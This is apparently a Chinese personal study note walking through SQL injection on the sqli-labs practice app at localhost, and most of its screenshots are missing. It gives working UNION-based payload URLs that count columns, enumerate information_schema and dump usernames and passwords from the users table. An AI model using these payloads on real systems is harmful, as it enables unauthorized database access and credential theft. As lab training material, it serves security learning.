# sql注入

> 1、判断是否有注入
>
> 2、判断是什么类型的注入
>
> 3、语句是否能被修改（增加语句）
>
> 4、语句是否能够执行。



## 1、准备

### 1.1、工具

- Sqli-labs
- HackBar调试工具

### 1.2、表结构分析

原表结构：

![image-20211215111211664](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215111211664.png)

## 2、注入语句

### 2.1、无注入，直接访问。

![image-20211215111354084](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215111354084.png)

### 2.2、注入测试

#### 2.2.1、什么类型的注入？

>  参数：id=1 

正确！！！

![image-20211215145501982](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215145501982.png)





======================================================================================

> 参数 id=1'

错误！报错，多了一个单引号。

![image-20211215145754925](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215145754925.png)





=======================================================================================

> 参数：id=1"

![image-20211215150415994](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215150415994.png)

#### 2.2.2、分析语句

初步判定

**select name,password from users where id=1 limit 0,1;**



#### 2.2.3 找出该表的列数

> 加上参数 order by 1/2/3   

http://localhost/sqli-labs-master/Less-2/?id=1 order by 1 #

![image-20211215152936710](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215152936710.png)

http://localhost/sqli-labs-master/Less-2/?id=1 order by 2 #

![image-20211215153132794](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215153132794.png)







http://localhost/sqli-labs-master/Less-2/?id=1 order by 3#

![image-20211215153228846](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215153228846.png)

经过测试：发现当order by 4的时候，发现报出找不到列的错误，由此推断，发现该表有三列

![image-20211215153457323](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215153457323.png)



联合查询

还可以通过联合查询的方式，找出该表拼接的数据是否成功

联合查询条件：**合并结果集的时候，需要查询字段对应个数相同**

例如：

![image-20211215154442832](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215154442832.png)

![image-20211215154516203](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215154516203.png)

![image-20211215154538798](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215154538798.png)

我们可以发现，当联合语句union select 1,2,3的时候，可以查出相关信息，满足和第一条查询语句拼接的条件。

```sql
select 1,2,3
#其中，1，2，3代表着占位符，没有指明要查询哪一个数据库，哪一个表，就会生成列名为1,2,3 值为：1,2,3的一个表
```

### 2.3、注入查询

查询当前数据库的名子

#### 2.3.1、数据库信息

![image-20211215161029192](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215161029192.png)

![image-20211215161308568](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215161308568.png)

查出数据库名：http://localhost/sqli-labs-master/Less-2/?id=1111 union select 2,user() ,3 #

![image-20211215161523348](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215161523348.png)

#### 2.3.2、所有数据库名

首先我们要知道：mysql里面所有的数据库名字都早information_schema里面的schema这个表里面

![image-20211215162034385](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215162034385.png)

数据库所有表名都在：information_schema里面的tables这个表里面

![image-20211215162141934](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215162141934.png)

数据库所有表里面的字段都在：information_schema里面column这个表里面

![image-20211215162255049](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215162255049.png)





**所以我们可以注入查询所有数据库的名字**

![image-20211215162957801](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215162957801.png)

查询所有的数据库名称

**concat()函数**

功能：将多个字符串连接成一个字符串。



![image-20211215164837739](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215164837739.png)

#### 2.3.3、当前数据库名

http://localhost/sqli-labs-master/Less-2/?id=1111 union select 2,database(),3 from information_schema.schemata %23

![image-20211215165419185](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215165419185.png)

#### 2.3.3、当前数据库名所有表名

http://localhost/sqli-labs-master/Less-2/?id=1111 union select 2,group_concat(table_name) ,3 from information_schema.tables where table_schema=database() %23

![image-20211215171416090](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215171416090.png)

#### 2.3.4、当前表的所有字段

![image-20211215172353953](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215172353953.png)

#### 2.3.5、查询所有的用户和密码

已经从上面知道数据库和表明，所以可以直接查询

http://localhost/sqli-labs-master/Less-2/?id=1111 union select 2,group_concat(username),group_concat(password) from security.users %23

![image-20211215173417013](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215173417013.png)

拼接函数：

http://localhost/sqli-labs-master/Less-2/?id=1111 union select 2,group_concat(concat_ws(':',username,password)),3 from security.users %23

![image-20211215174934439](C:\Users\Lance\AppData\Roaming\Typora\typora-user-images\image-20211215174934439.png)